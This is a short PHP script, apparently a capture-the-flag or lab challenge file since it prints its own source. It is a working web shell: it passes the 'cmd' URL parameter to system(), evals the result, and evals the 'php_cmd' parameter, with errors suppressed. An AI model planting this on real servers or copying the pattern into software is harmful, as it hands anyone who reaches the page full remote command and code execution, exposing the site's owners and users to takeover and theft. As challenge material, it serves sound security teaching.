<?php 
error_reporting(0);
$a = $_GET['cmd'];
$b = system($a);
@eval($b);
@eval($_GET['php_cmd']);
show_source(__FILE__);  
?>
